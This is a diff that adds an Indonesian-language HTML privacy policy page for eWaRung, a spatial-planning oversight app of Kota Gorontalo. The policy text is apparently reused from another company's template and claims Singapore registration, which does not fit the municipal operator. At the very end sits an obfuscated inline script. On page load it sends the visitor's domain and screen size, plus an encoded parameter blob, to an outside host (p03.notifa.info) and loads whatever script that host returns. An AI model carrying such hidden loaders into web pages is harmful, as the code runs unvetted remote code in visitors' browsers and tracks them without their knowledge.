@@ -1,0 +1,679 @@
+
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <title>eWaRung - Ketentuan Kerahasiaan</title>
+    <style>
+        .plainContent {
+            width: 960px;
+            margin: 20px auto 80px auto;
+        }
+
+        .mcp-placeholder > .plainContent:nth-child(1) {
+            margin: 150px auto 80px auto;
+        }
+
+        .plainContent {
+            color: #434343;
+        }
+
+        .plainContent p {
+            line-height: 1.5;
+            font-size: 15px;
+            margin: 16px 0;
+        }
+
+        .plainContent h1, h2 {
+            font-weight: bold;
+            line-height: 1.3;
+            margin: 24px 0;
+        }
+
+        .plainContent h3, h4, h5 {
+            font-weight: bold;
+            line-height: 1.5;
+            margin: 16px 0;
+        }
+
+        .plainContent h1 {
+            font-size: 34px;
+        }
+
+        .plainContent h2 {
+            font-size: 28px;
+        }
+
+        .plainContent h3 {
+            font-size: 22px;
+        }
+
+        .plainContent h4 {
+            font-size: 18px;
+        }
+
+        .plainContent h5 {
+            font-size: 15px;
+        }
+
+        .plainContent ul {
+            list-style: disc;
+            padding-left: 30px;
+        }
+
+        .plainContent li {
+            list-style: disc;
+            margin: 8px 0;
+        }
+
+        .plainContent a, .plainContent a:visited, .plainContent a:focus {
+            color: #0770CD;
+        }
+
+        .header-simple {
+            padding: 32px;
+            text-align: center;
+        }
+
+        .header-simple img {
+            display: inline-block;
+            margin-left: 32px;
+        }
+
+        .styles {
+            background: url("https://s3-ap-southeast-1.amazonaws.com/traveloka/imageResource/mcp/componentType/1468569417420-desktopWeb.png") no-repeat center;
+            background-size: contain;
+            min-height: 30px;
+            width: 100%;
+            display: none;
+        }
+
+        .editing .styles {
+            display: block;
+        }
+
+        .formal {
+            padding: 10px;
+            text-align: justify
+        }
+
+        .formal h1, .formal h2 {
+            color: #333;
+            font-weight: 400
+        }
+
+        .formal h1 {
+            text-align: center;
+            font-size: 22px;
+            line-height: 50px
+        }
+
+        .formal h2 {
+            text-align: left;
+            font-size: 14px
+        }
+
+        .formal p {
+            font-size: 12px;
+            text-align: justify
+        }
+
+        .formal ol, .formal ul {
+            color: #777;
+            padding-right: 15px;
+            margin: 0 0 16px 15px;
+            counter-reset: section
+        }
+
+        .formal ol li {
+            background: 0;
+            border: 0 none;
+            font-size: 12px;
+            outline: 0 none;
+            vertical-align: baseline;
+            list-style-type: decimal;
+            margin-left: 20px;
+            padding-left: 3px;
+            display: list-item
+        }
+
+        .formal ol.lowerAlpha li {
+            list-style-type: lower-alpha
+        }
+
+        .formal ol.lowerRoman li {
+            list-style-type: lower-roman
+        }
+
+        .formal ol.decimal, .formal ol.lowerAlpha, .formal ol.lowerRoman {
+            margin: 0
+        }
+
+        .formal ol.nestedNumbering {
+            padding: 0;
+            display: block;
+            margin: 0 0 16px 0
+        }
+
+        .formal ol.nestedNumbering > li:not(.nestedTitle) {
+            padding-left: 15px;
+            display: block;
+            position: relative
+        }
+
+        .formal ol.nestedNumbering > li:before {
+            counter-increment: section;
+            content: counters(section, ".") " ";
+            position: absolute;
+            right: 100%
+        }
+
+        .formal ol.nestedNumbering li.nestedTitle {
+            color: #000
+        }
+
+        .formal ol.nestedNumbering li.nestedTitle:before {
+            content: ""
+        }
+
+        .formal ul li {
+            background: 0;
+            border: 0 none;
+            font-size: 12px;
+            outline: 0 none;
+            vertical-align: baseline;
+            list-style-type: disc;
+            margin-left: 20px;
+            padding-left: 3px;
+            display: list-item
+        }
+
+        #tv-topbar {
+            height: auto !important
+        }
+
+        .brand {
+            display: block;
+            text-align: center
+        }
+
+        #tv-slim-logo {
+            transform: scale(0.85) !important;
+            transform-origin: center center;
+            position: relative;
+            display: inline-block;
+            box-sizing: border-box;
+            left: 5px
+        }
+
+        #container {
+            width: 100% !important;
+            counter-reset: theNumber
+        }
+
+        #policyContainer {
+            padding: 0 20px
+        }
+
+        .zopim {
+            transform: scale(0.75) !important;
+            transform-origin: right bottom;
+            right: 20px !important
+        }
+
+        .formal h1 {
+            text-align: left !important;
+            border-bottom: 1px solid #ddd;
+            margin-bottom: 15px
+        }
+
+        .formal h2 {
+            font-size: 16px !important;
+            margin-bottom: 15px !important;
+            margin-top: 30px;
+            font-weight: 700 !important
+        }
+
+        .formal ul {
+            margin: 0 0 20px !important
+        }
+
+        .formal ul li {
+            font-size: 14px !important;
+            line-height: 1.5
+        }
+
+        .formal ul li:not(:last-child) {
+            margin-bottom: 3px
+        }
+
+        p {
+            font-size: 16px !important;
+            line-height: 1.5;
+            color: #434343 !important
+        }
+
+        .formal > ol > li {
+            margin-left: 15px !important;
+            padding-left: 10px !important;
+            font-size: 14px !important
+        }
+
+        .formal > ol > li > ol > li {
+            padding-left: 20px !important
+        }
+
+        .nestedNumbering {
+            margin: 10px 0 0 0 !important
+        }
+
+        .nestedTitle {
+            position: relative !important;
+            list-style: none !important;
+            counter-increment: theNumber
+        }
+
+        .nestedTitle:before {
+            content: counter(theNumber) ". " !important
+        }
+
+        .nestedTitle:first-child {
+            border-top: 1px solid #ddd;
+            padding-top: 20px;
+            margin-top: 20px
+        }
+
+        .nestedTitle:not(:first-child) {
+            margin-top: 20px
+        }
+
+        .nestedNumbering > li {
+            margin-left: 15px !important;
+            padding-left: 15px !important;
+            line-height: 1.5;
+            font-size: 14px !important
+        }
+
+        .nestedNumbering > li:before {
+            left: -15px !important
+        }
+
+        .nestedNumbering > li:not(:last-child) {
+            margin-bottom: 10px
+        }
+
+        .decimal, .lowerAlpha {
+            margin-top: 10px !important;
+            padding: 0 !important
+        }
+
+        .decimal li, .lowerAlpha li {
+            font-size: 13px;
+            margin-left: 10px !important
+        }
+
+        .decimal li:not(:last-child), .lowerAlpha li:not(:last-child) {
+            margin-bottom: 5px
+        }
+
+        a {
+            color: #1ba0e2 !important;
+            text-decoration: none !important
+        }
+
+        .footer {
+            padding: 20px 15px 30px;
+            text-align: center;
+            border-top: 1px solid #ddd
+        }
+
+        .footer p {
+            display: inline-block;
+            margin: 0;
+            color: #888
+        }</style>
+</head>
+<body class="">
+<noscript>
+    <iframe src="//www.googletagmanager.com/ns.html?id=GTM-WXGS2P" height="0" width="0"
+            style="display:none;visibility:hidden"></iframe>
+</noscript>
+
+
+<div>
+    <ul id="tvAlert" style="display:none">
+        <li id="tvAlertImageCntr">
+            <div id="tvAlertImageHolder"></div>
+            <div id="tvAlertImage" class="cs0"></div>
+        </li>
+        <li id="tvAlertMsgCntr">
+            <div id="tvAlertHeaderCntr">
+                <div id="tvIconInDialog" class=""></div>
+                <div class="tvCloseGreyIcon"></div>
+            </div>
+            <div id="tvAlertTitle"></div>
+            <div id="tvAlertContent"></div>
+            <img id="tvAlertLoadingImg" width="190" height="30" alt="..."
+                 src="https://dkp56lbqbfu1n.cloudfront.net/godwit/src/images/desktop/assets/misc/redirect.gif"/></li>
+    </ul>
+</div>
+
+<div class="tvGeneralLayout" id="tvPromo">
+    <div id="tv-top-layout"></div>
+    <noscript>Situs ini membutuhkan Javascript. Silakan aktifkan Javascript untuk melanjutkan.</noscript>
+    <div></div>
+    <div id="desktopContent">
+        <div class="cleanLayoutDesktop ">
+            <div class="contentWrapper">
+                <div class="mcp-placeholder" data-name="content">
+                    <div class="component-overflow header-simple" data-component=""
+                         data-name="LandingPrivacyPolicy_Header" data-id="1469167932251">EWARUNG(Sistem Pengawasan Penataan Ruang Elektronik) KOTA GORONTALO
+                    </div>
+                    <div class="component-overflow plainContent formal" data-component=""
+                         data-name="LandingPrivacyPolicy_Content" data-id="1469168022175"><h3>KEBIJAKAN PRIVASI</h3>
+                        <p>Kebijakan Privasi ini menjelaskan bagaimana kami mengumpulkan,
+                            menggunakan, menyingkapkan, memproses dan melindungi informasi pribadi yang teridentifikasi
+                            (&quot;Data Pribadi&quot;) yang Anda (&quot;Pengguna&quot;) dapat berikan sehubungan dengan
+                            layanan yang tersedia melalui aplikasi android (&quot;Aplikasi Mobile&quot;). Dengan
+                            mengunjungi atau menggunakan Aplikasi, Anda sepakat dan menyetujui pengumpulan, penggunaan,
+                            penyingkapan dan pemrosesan Data Pribadi Anda sesuai dengan Kebijakan Privasi ini dan/atau
+                            Persyaratan Aplikasi. Jika Anda tidak setuju dengan Kebijakan Privasi di bawah ini, silakan
+                            segera tinggalkan Aplikasi.</p>
+
+                        <p>Kebijakan Privasi ini untuk mencerminkan
+                            perubahan dalam hukum, pengumpulan dan praktik penggunaan Data Pribadi kami, fitur Situs
+                            kami, atau kemajuan dalam teknologi. Anda akan dianggap telah menyetujui
+                            setiap modifikasi Kebijakan Privasi ketika Anda menggunakan Situs setelah tanggal berlaku
+                            modifikasi.</p>
+
+                        <h4>1. Informasi yang Kami Kumpulkan</h4>
+
+                        <p>Kami mengumpulkan Data Pribadi mengenai Anda yang diberikan kepada kami saat menggunakan
+                            Aplikasi. Data Pribadi tersebut termasuk namun tidak terbatas pada nama Anda, identifikasi
+                            pengguna Aplikasi dan kredensial login, alamat, nomor telepon, alamat e-mail. Kami juga mengumpulkan
+                            informasi non-pribadi yang teridentifikasi (yang tidak dapat digunakan untuk
+                            mengidentifikasi Anda), termasuk namun tidak terbatas pada alamat protokol internet (&quot;IP&quot;)
+                            Anda, data lokasi geografis, jenis sistem pengoperasian, kebangsaan, preferensi pencarian,
+                            begitu pula data umum lainnya terkait penggunaan Internet.</p>
+
+                        <h4>2. Bagaimana Kami Menggunakan Informasi Anda</h4>
+
+                        <p>Kami dapat menggunakan Data Pribadi Anda dan informasi lainnya yang dikumpulkan melalui
+                            Aplikasi untuk tujuan berikut:</p>
+
+                        <ul>
+                            <li>mendaftar, mengelola dan/atau mengurus penggunaan dan/atau akses Aplikasi;</li>
+                            <li>mengelola, mengoperasikan, mengurus dan memberikan Anda layanan yang ditawarkan di
+                                Aplikasi;
+                            </li>
+                            <li>menghubungi Anda mengenai hal-hal yang berkaitan dengan penggunaan Anda dan/atau akses
+                                Aplikasi, dan setiap pertanyaan dan/atau permintaan yang diajukan
+                                oleh Anda melalui Aplikasi atau sebaliknya;
+                            </li>
+                            <li>menyesuaikan pengalaman Anda saat menggunakan Aplikasi;</li>
+                            <li>mengukur dan meningkatkan pengalaman dan kepuasan pelanggan;</li>
+                            <li>menegakkan Syarat dan Ketentuan;</li>
+                            <li>untuk tujuan lain yang diberitahukan kepada Anda pada saat pengumpulan.</li>
+                        </ul>
+
+                        <p>Kami juga dapat menggunakan Data Pribadi Anda dan informasi lainnya yang dikumpulkan untuk
+                            pemasaran Media Sosial menggunakan teknik grafik langsung dan terbuka, dan untuk tujuan
+                            pemasaran digital dan konvensional seperti mengirimkan Anda surat elektronik langsung dan
+                            memberitahukan tentang produk baru, penawaran khusus atau informasi lain yang menurut kami
+                            akan menarik bagi Anda. Harap dicatat bahwa Anda dapat memilih untuk keluar dari setiap
+                            materi pemasaran yang mungkin kami kirimkan kepada Anda kapan pun. Harap ikuti instruksi
+                            untuk berhenti berlangganan yang diatur di dalam materi pemasaran kami jika Anda memilih
+                            untuk keluar dari setiap materi pemasaran, dan kami akan menghormati keinginan Anda.</p>
+
+                        <h4>3. Berbagi dan Mentransfer Data Pribadi Anda</h4>
+
+                        <p>Harap dicatat bahwa Kami dapat menyingkap Data Pribadi Anda dalam situasi berikut:</p>
+
+                        <ul>
+                            <li>untuk mengadakan atau membela terhadap klaim atau gugatan apa pun;</li>
+                            <li>untuk mematuhi perintah pengadilan, proses peradilan, permintaan yang sah, surat
+                                perintah atau setara oleh pejabat penegak hukum atau pihak yang berwenang;
+                            </li>
+                            <li>untuk menyelidiki penipuan atau kesalahan lainnya, atau seperti yang dipersyaratkan
+                                lainnya atau diperlukan dalam rangka mematuhi hukum yang berlaku, atau untuk melindungi
+                                kepentingan sah kami;
+                            </li>
+                            <li>untuk pembeli sehubungan dengan penjualan, pekerjaan, atau pengalihan lain dari semua
+                                atau bagian dari bisnis atau perusahaan kami;
+                            </li>
+                            <li>untuk menegakkan atau menerapkan syarat dan ketentuan yang berlaku bagi produk dan
+                                layanan kami;
+                            </li>
+                            <li>untuk setiap situasi lain yang diperbolehkan menurut hukum.</li>
+                        </ul>
+
+                        <h4>4. Persetujuan</h4>
+
+                        <p>Sebagaimana dinyatakan di atas, dengan menjelajah dan menggunakan Aplikasi, atau dengan memesan
+                            produk dari Aplikasi, atau dengan mendaftarkan untuk atau menggunakan layanan di Aplikasi, atau
+                            dengan mengeklik tombol &quot;Konfirmasi&quot; atau setara ketika Anda membuat akun baru
+                            pada Aplikasi, Anda:</p>
+
+                        <ul>
+                            <li>menyetujui Kami mengumpulkan, menggunakan,
+                                menyingkap dan/atau mengolah data pribadi yang disebutkan di atas untuk tujuan seperti
+                                yang dijelaskan di atas; dan
+                            </li>
+                        </ul>
+
+                        <h4>5. Penarikan Persetujuan</h4>
+
+                        <p>Anda dapat menarik persetujuan terhadap pengumpulan, penggunaan atau penyingkapan kami atas
+                            data pribadi Anda setiap saat, dengan memberikan kami pemberitahuan yang beralasan. Jika
+                            Anda ingin menarik persetujuan Anda, harap beritahu kami pada detail kontak kami yang
+                            tertera di bawah ini. Kami akan berhenti mengumpulkan, menggunakan atau menyingkap data
+                            pribadi Anda setelah pemberitahuan, kecuali diwajibkan oleh hukum atau jika kami memiliki
+                            bisnis yang sah atau tujuan hukum untuk mempertahankannya. Harap memperhatikan bahwa dengan
+                            menarik persetujuan Anda terhadap pengumpulan, penggunaan atau penyingkapan kami atas data
+                            pribadi Anda, kami mungkin tidak dapat terus memberikan layanan kami kepada Anda, dan Anda
+                            setuju bahwa kami tidak akan bertanggung jawab kepada Anda atas setiap kerugian atau
+                            kerusakan yang timbul dari atau terkait penghentian layanan tersebut.</p>
+
+                        <h4>6. Kebijakan <i>Cookie</i></h4>
+
+                        <p><i>&quot;Cookie&quot;</i> adalah pengidentifikasi alfanumerik yang kami transfer ke <i>hard
+                            drive</i> atau kartu memori Anda melalui web <i>browser</i> ketika Anda mengunjungi Aplikasi
+                            kami. Hal ini memungkinkan sistem milik kami sendiri untuk mengenali Anda ketika Anda
+                            kembali mengunjungi Aplikasi kami dan meningkatkan layanan kami kepada Anda. Informasi ini
+                            digunakan untuk melacak penggunaan pengunjung Aplikasi dan mengkompilasi laporan statistik
+                            mengenai aktivitas Aplikasi. Untuk informasi lebih lanjut tentang <i>cookie</i>, kunjungi
+                            www.aboutcookies.org atau www.allaboutcookies.org. <i>Cookie</i> juga dapat digunakan untuk
+                            mengkompilasi informasi keseluruhan tentang area Aplikasi kami yang paling sering dikunjungi.
+                            Informasi lalu lintas ini dapat digunakan untuk meningkatkan konten Aplikasi kami dan membuat
+                            penggunaan Anda menjadi lebih mudah. Jika Anda ingin menolak <i>cookie</i> kami, Anda dapat
+                            mengkonfigurasi <i>browser</i> Anda untuk melakukannya. Namun, beberapa fitur Aplikasi kami
+                            mungkin tidak berfungsi jika Anda menghapus <i>cookie</i> dari <i>browser</i> Anda. Jika
+                            Anda tidak mengaktifkan <i>cookie</i>, Anda mungkin tidak dapat mengakses fungsi atau fitur
+                            penting pada Aplikasi ini, dan Anda mungkin hanya dapat menggunakan Aplikasi secara terbatas.</p>
+
+                        <h4>7. Akses ke atau Perbaikan Data Pribadi Anda</h4>
+
+                        <p>Ketika Anda memberikan kami Data Pribadi Anda, pastikan datanya akurat dan lengkap. Jika Anda
+                            percaya bahwa setiap informasi Anda yang kami miliki atau kendalikan mengandung kesalahan
+                            atau kelalaian, harap login ke akun Anda di Aplikasi dan perbaiki informasinya. Selain itu,
+                            harap perbarui Data Pribadi Anda melalui akun Anda pada waktu yang tepat, jika terdapat
+                            perubahan.</p>
+
+                        <p>Jika Anda ingin memperbaiki kesalahan atau kelalaian pada Data Pribadi manapun di bawah
+                            kepemilikan atau kendali kami yang tidak dapat dikoreksi melalui Aplikasi kami, atau untuk
+                            mengakses Data Pribadi Anda di bawah kepemilikan atau kendali kami, atau sebagaimana diatur
+                            oleh hukum yang berlaku, harap kirimkan permintaan Anda ke detail kontak kami yang tertera
+                            di bawah ini. Kami mungkin membebani Anda biaya yang wajar untuk akses ke Data Pribadi,
+                            untuk tujuan pemulihan biaya tambahan karena menanggapi permintaan akses tersebut.</p>
+
+                        <p>Untuk melindungi privasi dan keamanan Anda, kami akan memverifikasi identitas Anda sebelum
+                            memberikan akses atau melakukan perubahan pada Data Pribadi Anda. Kami akan berusaha
+                            menjawab permintaan untuk akses atau perbaikan Data Pribadi Anda sesegera mungkin, kecuali
+                            berlaku pengecualian.</p>
+
+                        <h4>8. Melindungi Data Pribadi Anda</h4>
+
+                        <p>Kami melindungi Data Pribadi di bawah kepemilikan atau kendali kami dengan mempertahankan
+                            pengaturan keamanan yang wajar, termasuk prosedur fisik, teknis dan organisasi, untuk
+                            mencegah akses, pengumpulan, penggunaan, penyingkapan, penyalinan, modifikasi, penghapusan
+                            yang tidak sah atau risiko yang sama.</p>
+
+                        <h4>9. Tautan ke Aplikasi Web Lain</h4>
+
+                        <p>Aplikasi kami dapat berisi tautan ke Aplikasi-Aplikasi lain yang menarik. Namun, setelah Anda
+                            menggunakan tautan tersebut untuk meninggalkan Aplikasi kami, Anda harus mengetahui bahwa kami
+                            tidak memiliki kendali atas Aplikasi web lain tersebut. Harap diketahui bahwa kami tidak
+                            bertanggung jawab atas praktik privasi Aplikasi web lain tersebut dan menyarankan Anda untuk
+                            membaca pernyataan privasi dari masing-masing Aplikasi web yang Anda kunjungi yang mengumpulkan
+                            informasi pribadi.</p>
+
+                        <h4>10. Pendaftaran dan Keanggotaan</h4>
+
+                        <p>Aplikasi ini memungkinkan Anda untuk membuat satu akun pengguna dengan mendaftar keanggotaan,
+                            berdasarkan data yang Anda berikan. Dengan memberikan data, mendaftar, dan membuat akun,
+                            Anda menjamin bahwa:</p>
+
+                        <ol>
+                            <li>Anda setidaknya berusia 18 tahun;</li>
+                            <li>Informasi tentang Anda adalah benar dan akurat, terkini dan lengkap sebagaimana
+                                diperlukan dalam formulir pendaftaran di Aplikasi (&quot;Data Pendaftaran&quot;); dan
+                            </li>
+                            <li>Anda akan memperbarui Data Pendaftaran ini agar selalu benar, akurat dan lengkap.</li>
+                        </ol>
+
+                        <p>Selanjutnya, Anda setuju bahwa Kami tidak bertanggung jawab atas kehilangan atau
+                            kerusakan yang mungkin diderita oleh kami, Anda atau pihak ketiga manapun, yang kerugian
+                            atau kerusakan tersebut disebabkan oleh ketidakakuratan atau tidak lengkapnya informasi yang
+                            diberikan oleh Anda. Setelah mendaftar, Anda akan menerima kata sandi dan identifikasi
+                            pengguna (&quot;Nama pengguna&quot;). Anda bertanggung jawab untuk menjaga kerahasiaan kata
+                            sandi dan Nama pengguna, dan Anda bertanggung jawab penuh atas semua kegiatan terkait Nama
+                            pengguna atau kata sandi. Anda hanya dapat menggunakan satu Nama pengguna dan kata sandi
+                            pada satu waktu dan tidak diperbolehkan untuk menggunakan lebih dari satu Nama pengguna.
+                            Kata sandi Anda semata-mata hanya untuk Anda gunakan sendiri, dan Anda setuju untuk
+                            benar-benar merahasiakan kata sandi Anda. Anda setuju untuk segera memberitahukan Kepada Kami
+                            tentang penggunaan kata sandi atau akun yang tidak sah atau pelanggaran keamanan lainnya.
+                            Untuk keamanan yang lebih bagus, harap pastikan bahwa Anda <i>logout</i> atau keluar dari
+                            akun setelah setiap kali penggunaan Aplikasi ini. Anda setuju bahwa Kami tidak akan
+                            bertanggung jawab atas setiap kerugian atau kerusakan yang diderita oleh kami, Anda atau
+                            pihak ketiga yang timbul akibat kegagalan Anda untuk mematuhi ketentuan ini.</p>
+
+                        <h4>11. Pengalihan Bisnis</h4>
+
+                        <p>Dalam hal terjadi perubahan kendali atau perubahan kepemilikan atas semua atau sebagian dari
+                            bisnis Kami atau perusahaan, termasuk Aplikasi, maka Data Pribadi Pengguna mungkin/akan
+                            menjadi bagian dari pengalihan aset tersebut.</p>
+
+                        <h4>12. Persetujuan Perubahan Kebijakan Privasi</h4>
+
+                        <p>Dengan menggunakan Aplikasi atau layanan yang kami sediakan, Anda setuju dengan pengumpulan,
+                            penggunaan, penyingkapan dan pengolahan Data Pribadi Anda sebagaimana diatur dalam Kebijakan
+                            Privasi ini. Lebih lanjut, jika Anda menggunakan layanan kami, kami berhak mengumpulkan,
+                            menggunakan, menyingkap dan memproses Data Pribadi Anda sesuai dengan Kebijakan Privasi ini.
+                            Dari waktu ke waktu, Kami dapat mengubah Kebijakan Privasi ini. Sebagaimana dijelaskan
+                            pada awal Kebijakan Privasi ini, kami akan menampilkan perubahan pada Aplikasi ini untuk
+                            informasi Anda.</p>
+
+                        <h4>13. Urutan Prioritas</h4>
+
+                        <p>Jika Anda telah menyetujui Persyaratan Aplikasi Web kami, dalam hal terdapat perbedaan antara
+                            Persyaratan Aplikasi Web tersebut dan Kebijakan Privasi ini, maka Persyaratan Aplikasi Web yang
+                            akan berlaku.</p>
+
+                        <h4>14. <i>Disclaimer</i></h4>
+
+                        <p>Harap perhatikan bahwa mengingat kami merupakan perusahaan yang terdaftar di Singapura, maka
+                            Kebijakan Privasi ini telah disusun semata-mata sesuai dengan hukum Singapura. Kami tidak
+                            mewakili atau menjamin bahwa Kebijakan Privasi ini mematuhi undang-undang privasi dari
+                            setiap yurisdiksi lainnya dan dengan demikian, Anda tidak akan menafsirkan Kebijakan Privasi
+                            ini begitu saja.</p>
+
+                        <p>Untuk menghindari keraguan, atas pengecualian yang hukum mengizinkan suatu organisasi seperti
+                            untuk mengumpulkan, menggunakan atau menyingkap data pribadi Anda tanpa
+                            persetujuan Anda, maka izin tersebut yang diberikan oleh hukum akan terus berlaku.</p>
+
+                        <h4>15. Hubungi Kami</h4>
+
+                        <p>Jika Anda memiliki pertanyaan atau permintaan apa pun yang berkaitan dengan Kebijakan Privasi
+                            ini, harap hubungi Petugas Perlindungan Data kami di detail berikut ini, atau orang yang
+                            mungkin ditunjuk oleh Kami dengan memberikan informasi kepada Anda melalui surat,
+                            faktur, email atau Situs: privacy@ewarung.com.</p>
+
+                        <br/>
+                        <p><i>Konten ini adalah terjemahan dari versi asli bahasa Inggris dan disediakan untuk
+                            kenyamanan Anda. Terdapat kemungkinan bahwa beberapa teks mungkin berbeda dari versi asli
+                            bahasa Inggris, dan dalam hal terjadi ambiguitas antara versi terjemahan dan versi bahasa
+                            Inggris, maka versi bahasa Inggris yang akan berlaku. Jika ragu mengenai keakuratan
+                            informasi yang terkandung dalam terjemahan, harap merujuk teks versi bahasa Inggris yang
+                            merupakan versi resmi</i></p>
+
+                        <p>Efektif October 2018</p>
+
+                        <p>© 2018 Penataan Ruang Kota Gorontalo</p></div>
+                </div>
+            </div>
+            <div class="mcp-placeholder hiddenContent" data-name="hiddenContent">
+                <div class="component-overflow styles" data-component="" data-name="LandingTermsAndConditions_Style"
+                     data-id="1468569504240"></div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<style>body .buorg {
+    background-color: #f4fbfe;
+    border: none;
+}
+
+body .buorg > div {
+    width: 672px;
+    margin-left: -457px;
+    left: 50%;
+    position: relative;
+    padding-right: 240px;
+    text-align: left;
+    line-height: 22px;
+}
+
+body .buorg .buorg-buttons {
+    position: absolute;
+    right: 0;
+    top: 50%;
+    transform: translateY(-50%);
+    line-height: 35px;
+}
+
+body .buorg div a {
+    border-radius: 2px;
+    background: #086fce;
+}
+
+body .buorg #buorgig {
+    background-color: #f6f6f6;
+    color: #086fce;
+}</style>
+<script>var $buoop = {
+    notify: {e: 10, f: 26, o: 16, s: 6, c: 29}, insecure: true, api: 5,
+    onshow: function (infos) {
+        if (gtmDataLayer) gtmDataLayer.push({event: 'BrowserUpdateNotificationShowed'});
+    },
+    onclose: function (infos) {
+        if (gtmDataLayer) gtmDataLayer.push({event: 'BrowserUpdateNotificationClosed'});
+    },
+    onclick: function (infos) {
+        if (gtmDataLayer) gtmDataLayer.push({event: 'BrowserUpdateNotificationClicked'});
+    }
+};
+
+function $buo_f() {
+    var e = document.createElement("script");
+    e.src = "//browser-update.org/update.min.js";
+    document.body.appendChild(e);
+};
+try {
+    document.addEventListener("DOMContentLoaded", $buo_f, false)
+}
+catch (e) {
+    window.attachEvent("onload", $buo_f)
+}</script>
+<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JQuX3gzRncX4VigYEZP2zO32%2fpPv6BkLKEXzV1KEIFcrNXL3tbBSjBfRw1KmiGEiasiOpKh1GfKV1MF9MB%2bOCmG7roiQRYECZ501%2f3ssV3xStSVDqUVO7Sa0nahFRsuNw6B7BLRWUURcGPLh2hoZO0hwpRwlB%2blV9l4eBet5HT9%2f%2fXt9dVOQmdNptfPi35Jx3vNdEJKWrbJD1QDLYTlZkHa%2fSYKpPHDjXtXdaLmbNCXuY5GmhV%2f9RcMOr8zZWN%2fZCUoIxQFWDP%2fV3MiaaTaQ7pVt%2b%2fe7iIe9SZ1m2M%2bYH4tHv%2bYgD%2fw2AACuBef3KymOzYSXJ%2b%2b3zqbWBFPSq7xu6r2a7ZOeyeUmuS%2b4yfn0d1pGtqLkWAlEqsRig2WRaNndfg4jAYzIvWr12KnRqug6jmslLuqGyQT8c4lMs8wxOC8ato%2b4%2bQX0yVTfu26yvaDjP3tSIityiFO6KJyH6yY%2fCcUjOB6%2fr1i7ROvn1JR%2fZHuOrAolkz%2bFzb6vIYl%2b6zTsLCekVeEA2B9jshjJjp6b8PjhaViyPxBVJ29jakwk3sqNScSZj4%2bkhYzOM2I11eRakqLDfraXK2p" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
+</html>
